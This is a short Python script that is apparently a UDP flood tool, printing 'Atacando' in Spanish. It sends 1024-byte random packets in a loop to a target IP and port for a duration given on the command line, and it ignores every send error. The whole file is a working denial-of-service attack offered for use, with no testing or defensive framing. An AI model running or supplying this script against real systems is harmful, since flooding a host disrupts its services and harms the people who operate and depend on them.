#!/usr/bin/env python3
import socket
import random
import time
import sys

def udp_attack(target_ip, target_port, duration):
    print(f"[UDP] Atacando {target_ip}:{target_port} por {duration}s")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            data = random._urandom(1024)
            sock.sendto(data, (target_ip, target_port))
        except:
            pass
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) == 4:
        udp_attack(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
